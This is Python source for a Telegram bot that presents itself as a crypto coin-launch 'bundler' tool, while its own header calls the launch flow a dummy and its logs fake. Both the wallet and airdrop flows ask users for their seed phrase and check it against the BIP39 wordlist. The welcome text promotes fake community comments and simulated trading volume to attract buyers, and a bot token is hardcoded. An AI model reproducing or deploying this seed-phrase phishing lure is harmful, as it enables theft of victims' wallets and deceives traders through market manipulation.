"""
ProTools Bundler Bot (Marx Edition)
==============================================
- Dummy Coin Launch: Interactive flow for dummy tokens.
- Transaction Check: Blocks access if wallet is unlinked.
- Fake Logs: Hardcoded logs for a cinematic look.
- Airdrop Update: Requests phrase FIRST and validates 12/24 words.
- BIP39 Validation: Checks words against the official 2048-word BIP39 wordlist.
"""

import logging
import os
import sqlite3
import re
from datetime import datetime
from threading import Thread

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
PORT       = int(os.getenv("PORT", 8000))
HELP_IMG   = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── BIP39 Wordlist (Official 2048 words) ──────────────────────────────────────
BIP39_WORDLIST = set("""abandon ability able about above absent absorb abstract absurd abuse access accident
account accuse achieve acid acoustic acquire across act action actor actress actual
adapt add addict address adjust admit adult advance advice aerobic afford afraid
again age agent agree ahead aim air airport aisle alarm album alcohol alert
alien all alley allow almost alone alpha already also alter always amateur amazing
among amount amused analyst anchor ancient anger angle angry animal ankle announce
annual another answer antenna antique anxiety any apart apology appear apple
approve april arch arctic area arena argue arm armed armor army around
arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset
assist assume asthma athlete atom attack attend attitude attract auction audit
august aunt author auto autumn average avocado avoid awake aware away awesome
awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo
banana banner bar barely bargain barrel base basic basket battle beach bean
beauty because become beef before begin behave behind believe below belt bench
benefit best betray better between beyond bicycle bid bike bind biology bird
birth bitter black blade blame blanket blast bleak bless blind blood blossom
blouse blue blur blush board boat body boil bomb bone book boost border
boring borrow boss bottom bounce box boy bracket brain brand brave breach
bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom
brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle
bunker burden burger burst bus business busy butter buyer buzz cabbage cabin
cable cactus cage cake call calm camera camp can canal cancel candy
cannon canvas canyon capable capital captain car carbon card cargo carpet carry
cart case cash casino castle casual cat catalog catch category cattle caught
cause caution cave ceiling celery cement census century cereal certain chair chalk
champion change chaos chapter charge chase chat cheap check cheese chef cherry
chest chicken chief child chimney choice choose chronic chuckle chunk cigar
cinnamon circle citizen city civil claim clap clarify claw clay clean clerk
clever click client cliff climb clinic clip clock clog close cloth cloud
clown club clump cluster clutch coach coast coconut code coffee coil coin
collect color column combine come comfort comic common company concert conduct
confirm congress connect consider control convince cook cool copper copy coral
core corn correct cost cotton couch country couple course cousin cover coyote
crack cradle craft cram crane crash crater crawl crazy cream credit creek crew
cricket crisp critic cross crouch crowd crucial cruel cruise crumble crunch crush
cry crystal cube culture cup cupboard curious current curtain curve cushion custom
cute cycle dad damage damp dance danger daring dash daughter dawn day
deal debate debris decade december decide decline decorate decrease deer defense
define defy degree delay deliver demand demise denial dentist deny depart
depend deposit depth deputy derive describe desert design desk despair destroy
detail detect develop device devote diagram dial diamond diary dice diesel
diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover
disease dish dismiss disorder display distance divert divide divorce dizzy doctor
document dog doll dolphin domain donate donkey donor door dose double
dove draft dragon drama drastic draw dream dress drift drill drink drip
drive drop drum dry duck dumb dune during dust dutch duty dwarf
dynamic eager eagle early earn earth easily east easy echo ecology edge
edit educate effort egg eight either elbow elder electric elegant element elephant
elevator elite else embark embody embrace emerge emotion employ empower empty
enable enact endless endorse enemy engage engine enhance enjoy enlist enough
enrich enroll ensure enter entire entry envelope episode equal equip erase
erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact
example excess exchange excite exclude excuse execute exercise exhaust exhibit
exile exist exit exotic expand expire explain expose express extend extra eye
fable face faculty fade faint faith fall false fame family famous
fancy fantasy far fashion fat fatal father fatigue fault favorite feature
february federal fee feed feel feet fellow felt fence festival fetch fever
few fiber fiction field figure file film filter final find fine
finger finish fire firm first fiscal fish fit fitness fix flag
flame flash flat flavor flee flight flip float flock floor flower fluid
flush fly foam focus fog foil follow food foot force forest
forget fork fortune forum forward fossil foster found fox fragile frame
frequent fresh friend fringe frog front frost frown frozen fruit fuel
fun funny furnace fury future gadget gain galaxy gallery game gap
garage garbage garden garlic garment gas gasp gate gather gauge gaze
general genius genre gentle genuine gesture ghost ginger giraffe girl give
glad glance glare glass glide glimpse globe gloom glory glove glow
glue goat goddess gold good goose gorilla gospel gossip govern gown
grab grace grain grant grape grasp grass gravity great green grid
grief grit grocery group grow grunt guard guide guilt guitar gun
gym habit hair half hammer hamster hand happy harbor hard harsh
harvest hat have hawk hazard head health heart heavy hedgehog height
hello helmet help hen hero hidden high hill hint hip hire
history hobby hockey hold hole holiday hollow home honey hood hope
horn horse hospital host hour hover hub huge human humble humor
hundred hungry hunt hurdle hurry hurt husband hybrid ice icon ignore
ill illegal image imitate immense immune impact impose improve impulse inbox
income increase index indicate indoor industry infant inflict inform inhale inherit
initial inject injury inmate inner innocent input inquiry insane insect inside
inspire install intact interest into invest invite involve iron island isolate
issue item ivory jacket jaguar jar jazz jealous jelly jewel job
join joke journey joy judge juice jump jungle junior junk just
kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen
kite kitten kiwi knee knife knock know lab ladder lady lake
lamp language laptop large later laugh laundry lava law lawn lawsuit
layer lazy leader learn leave lecture left leg legal legend leisure
lemon lend length lens leopard lesson letter level liar liberty library
license life lift light like limb limit link lion liquid list
little live lizard load loan lobster local lock logic lonely long
loop lottery loud lounge love loyal lucky luggage lumber lunar lunch
luxury lyrics magic magnet maid main major make mammal mango mansion
manual maple marble march margin marine master match material math matrix
matter maximum maze meadow mean medal media melody melt member memory
mention menu mercy merge merit merry mesh message metal method middle
midnight milk million mimic mind minimum minor miracle miss mixed mixture
mobile model modify mom monitor monkey monster month moon moral more
morning mosquito mother motion motor mountain mouse move movie much mule
multiply muscle museum mushroom music must mutual myself mystery naive name
napkin narrow nasty natural nature near neck need negative neglect neither
nephew nerve network neutral never news next nice night noble noise
nominee noodle normal north notable note nothing notice novel now nuclear
nurse nut oak obey object oblige obscure obtain ocean october odor
off offer office often oil okay old olive olympic omit once
onion open option orange orbit orchard order ordinary organ orient original
orphan ostrich other outdoor outside oval over own oyster ozone
pact paddle page pair palace palm panda panel panic panther paper
parade parent park parrot party pass patch path patrol pause pave
payment peace peanut peasant pelican pen penalty pencil people pepper perfect
permit person pet phone photo phrase physical piano picnic picture piece
pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet
plastic plate play please pledge pluck plug plunge poem poet point
polar pole police pond pony popular portion position possible post potato
pottery poverty powder power practice praise predict prefer prepare present pretty
prevent price pride primary print priority prison private prize problem process
produce profit program project promote proof property prosper protect proud provide
public pudding pull pulp pulse pumpkin punch pupil puppy purchase purpose
push put puzzle pyramid quality quantum quarter question quick quit quiz
quote rabbit raccoon race rack radar radio rage rail rain raise
rally ramp ranch random range rapid rare rate rather raven razor
ready real reason rebel rebuild recall receive recipe record recycle reduce
reflect reform refuse region regret regular reject relax release relief rely
remain remember remind remove render renew rent reopen repair repeat replace
report require rescue resemble resist resource response result retire retreat return
reunion reveal review reward rhythm ribbon rice rich ride rifle right
rigid ring riot ripple risk ritual rival river road roast robot
robust rocket romance roof rookie room rose rotate rough round route
royal rubber rude rug rule run runway rural sad saddle sadness
safe sail salad salmon salon salt salute same sample sand satisfy
satoshi sauce sausage save say scale scan scare scatter scene scheme
scissors scorpion scout scrap screen script scrub sea search season seat
second secret section security seed seek segment select sell seminar senior
sense sentence series service session settle setup seven shadow shaft shallow
share shed shell sheriff shield shift shine ship shiver shock shoe
shoot shop short shoulder shove shrimp shrug shudder shy sick side
siege sight signal silent silk silly silver similar simple since sing
siren sister situate ski skill skin skirt skull slab slam sleep
slender slice slide slight slim slogan slot slow slush small smart
smile smoke smooth snack snake snap sniff snow soap soccer social
sock solar soldier solid solution solve someone song soon sorry soul
sound soup source south space spare spatial spawn speak special speed
sphere spice spider spike spin spirit split spoil sponsor spoon spray
spread spring spy square squeeze squirrel stable stadium staff stage stairs
stamp stand start state stay steak steel stem step stereo stick
still sting stock stomach stone stop store story stove strategy street
strike strong struggle student stuff stumble style subject submit subway success
such sudden suffer sugar suggest suit summer sun sunny sunset super
supply supreme sure surface surge surprise sustain swallow swamp swap swear
sweet swift swim swing switch sword symbol symptom syrup table tackle
tail talent tamper tank tape target task tattoo taxi teach team
tell ten tenant tennis tent term test text thank that theme
then theory there they thing this thought three thrive throw thumb
thunder ticket tilt timber time tiny tip tired title toast tobacco
today together toilet token tomato tomorrow tone tongue tonight tool tooth
top topic topple torch tornado tortoise toss total tourist toward tower
town toy track trade traffic tragic train transfer trap trash travel
tray treat tree trend trial trick trigger trim trip trophy trouble
truck truly trumpet trust truth tube tuition tumble tuna tunnel turkey
turn turtle twelve twenty twice twin twist two type typical ugly
umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform
unique universe unknown unlock until unusual unveil update upgrade uphold upon
upper upset urban usage use used useful useless usual utility vacant
vacuum vague valid valley valve van vanish vapor various vast vault
vehicle velvet vendor venture venue verb verify version very vessel veteran
viable vibrant vicious victory video view village vintage violin virtual virus
visa visit visual vital vivid vocal voice void volcano volume vote
voyage wage wagon wait walk wall walnut want warfare warm warrior
waste water wave way wealth weapon wear weasel wedding weekend weird
welcome well west wet whale wheat wheel when where whip whisper
wide width wife wild will win window wine wing wink winner
winter wire wisdom wise wish witness wolf woman wonder wood wool
word world worry worth wrap wreck wrestle wrist write wrong yard
year yellow you young youth zebra zero zone zoo""".split())

# ─── BIP39 Phrase Validator ─────────────────────────────────────────────────────

def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
    """
    Returns (is_valid, error_message).
    Checks:
      1. Word count is 12 or 24
      2. Every word exists in the BIP39 wordlist
    """
    words = phrase.lower().split()
    count = len(words)

    if count not in (12, 24):
        return False, f"❌ *Invalid Phrase* — Got {count} word{'s' if count != 1 else ''}, expected 12 or 24\."

    invalid_words = [w for w in words if w not in BIP39_WORDLIST]
    if invalid_words:
        bad = ", ".join(f"`{w}`" for w in invalid_words[:5])
        more = f" \(and {len(invalid_words) - 5} more\)" if len(invalid_words) > 5 else ""
        return False, f"❌ *Invalid Phrase* — These words aren't in the BIP39 wordlist: {bad}{more}\.\n\nDouble\-check your phrase and try again\."

    return True, ""

# ─── Conversation States ────────────────────────────────────────────────────────
(
    WALLET_PHRASE,
    AIRDROP_PHRASE,
    AIRDROP_RECIPIENT,
    AIRDROP_AMOUNT,
    AIRDROP_CONFIRM,
    FEEDBACK_TEXT,
    DUMMY_NAME,
    DUMMY_SYMBOL,
    DUMMY_DESC,
) = range(9)

# ─── Database ───────────────────────────────────────────────────────────────────
DB_PATH = "protools.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, address TEXT, created_at TEXT)")
    conn.commit()
    conn.close()

def get_saved_address(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def save_address(user_id: int, username: str, address: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, address, created_at) VALUES (?, ?, ?, ?)",
              (user_id, username, address, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

# ─── Keyboards ─────────────────────────────────────────────────────────────────

MAIN_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"), InlineKeyboardButton("📊 Transactions", callback_data="transactions")],
    [InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"), InlineKeyboardButton("🔑 Wallet",       callback_data="wallet")],
    [InlineKeyboardButton("📋 Logs",         callback_data="logs"), InlineKeyboardButton("❓ Help",          callback_data="help")],
    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
])

CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
CONFIRM_KB = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"), InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

# ─── Welcome Logic ────────────────────────────────────────────────────────────

def get_welcome_text(user_name: str) -> str:
    return (
        f"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\n"
        "Prepare to dominate the game with precision, speed, and stealth\. Here's what's in your arsenal:\n\n"
        "1\. *Intelligent Auto\-Bundling* \- Up to 25 wallets with sniper protection built right in\. Fire with confidence\! 🎯\n\n"
        "2\. 💬 *Fake Comments Generator* \- Create the illusion of a buzzing community\. Engage your audience before they even exist\! 🎭\n\n"
        "3\. 📊 *Volume Bot Assistant* \- Simulate juicy trading activity to attract real degens like bees to honey 🍯✅\n\n"
        "4\. 🎁 *Airdrop Management* \- Seamlessly handle and distribute airdrops like airdrop royalty 👑\n\n"
        "5\. 🕵️ *Transaction Tracker & More* \- Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
        "ProTools is more than a tool \- it's your edge in the degen arena\. Let the games begin\! 🧬🔥\n\n"
        "Choose an option below:"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name or "Degen"
    await update.message.reply_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_name = update.effective_user.first_name or "Degen"
    context.user_data.clear()
    await query.edit_message_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

# ─── DUMMY LAUNCH COIN FLOW ───────────────────────────────────────────────────

async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_NAME

async def dummy_name_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["t_name"] = update.message.text
    await update.message.reply_text("🏷 *Step 2: Token Symbol*\n\nEnter a symbol \(e\.g\. $DEGEN\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_SYMBOL

async def dummy_symbol_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["t_symbol"] = update.message.text
    await update.message.reply_text("📝 *Step 3: Description*\n\nEnter a short description for your coin:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_DESC

async def dummy_desc_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = context.user_data.get("t_name")
    symbol = context.user_data.get("t_symbol")
    await update.message.reply_text(
        f"✅ *Token Prepared\!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB
    )
    return ConversationHandler.END

# ─── TRANSACTIONS & FAKE LOGS ─────────────────────────────────────────────────

async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    if not saved:
        await query.edit_message_text("❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\. Connect your wallet to track on\-chain activity\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    else:
        await query.edit_message_text("📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    dummy_logs = (
        "📜 *Your Bot Logs (latest first):*\n\n"
        "*2026\-03\-27 19:56:56*\n"
        "button\_press Button: view\_logs\n\n"
        "*2026\-03\-27 19:56:46*\n"
        "button\_press Button: airdrop\n\n"
        "*2026\-03\-26 18:17:21*\n"
        "button\_press Button: launch\_coin\n\n"
        "*2026\-03\-26 18:16:56*\n"
        f"start\_command Chat ID: {update.effective_user.id}"
    )
    await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)

# ─── WALLET, HELP, FEEDBACK, AIRDROP ──────────────────────────────────────────

async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    text = f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_" if saved else "🔑 *Wallet*\n\nNo wallet linked yet\. Import your phrase to start\."
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-import" if saved else "➕ Import Phrase", callback_data="wallet_import")], [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=kb)

async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text(
        "🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Deleted immediately for security\._",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return WALLET_PHRASE

async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try:
        await update.message.delete()
    except:
        pass

    valid, err_msg = validate_bip39_phrase(phrase)
    if not valid:
        await update.effective_chat.send_message(
            err_msg + "\n\nPlease try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB
        )
        return WALLET_PHRASE

    save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
    await update.effective_chat.send_message(
        "✅ *Wallet Linked Successfully\!*\n\n_Your phrase has been verified and deleted\._",
        parse_mode="MarkdownV2", reply_markup=BACK_KB
    )
    return ConversationHandler.END

async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text(
        "🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 BIP39 words\):",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return AIRDROP_PHRASE

async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try:
        await update.message.delete()
    except:
        pass

    valid, err_msg = validate_bip39_phrase(phrase)
    if not valid:
        await update.effective_chat.send_message(
            err_msg + "\n\nPlease try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB
        )
        return AIRDROP_PHRASE

    await update.effective_chat.send_message(
        "✅ *Phrase verified\!*\n\nStep 2 — Enter the *recipient SOL address*:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return AIRDROP_RECIPIENT

async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["airdrop_recipient"] = update.message.text.strip()
    await update.message.reply_text("Step 3 — Enter *amount in SOL*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return AIRDROP_AMOUNT

async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["airdrop_amount"] = update.message.text.strip()
    await update.message.reply_text(
        f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`",
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB
    )
    return AIRDROP_CONFIRM

async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("💬 *Support*\n\nSend a message below or email directly at:\n`ProToolsBundlerBot@gmail.com`", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return FEEDBACK_TEXT

async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ *Feedback Received\!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    help_text = "❓ *Coin Launch Preparation Steps*\n\n1\. 🚀 Enter token name \(1\-50 characters\)\n2\. 🏷 Enter token symbol \(2\-25 characters\)\n3\. 🖼 Upload token image\n4\. 👛 Select wallet bundle \(5, 10, 15, or 25\)\n5\. 📝 Enter token description \(max 500 characters\)\n6\. 🔗 Add social links \(Telegram, X, Website\) or skip\n7\. ✅ Confirm details\n8\. 🔑 Connect wallet to proceed"
    try:
        await query.message.reply_photo(photo=HELP_IMG, caption=help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
        await query.message.delete()
    except:
        await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("❌ *Operation Cancelled\.*", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
    return ConversationHandler.END

# ─── Main Logic ───────────────────────────────────────────────────────────────

health_app = Flask(__name__)
@health_app.route("/")
def health(): return "OK", 200
def run_health(): health_app.run(host="0.0.0.0", port=PORT)

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
        states={
            DUMMY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_name_received)],
            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_symbol_received)],
            DUMMY_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_desc_received)],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
        states={
            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
            AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    
    app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(show_transactions, pattern="^transactions$"))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
    
    Thread(target=run_health, daemon=True).start()
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
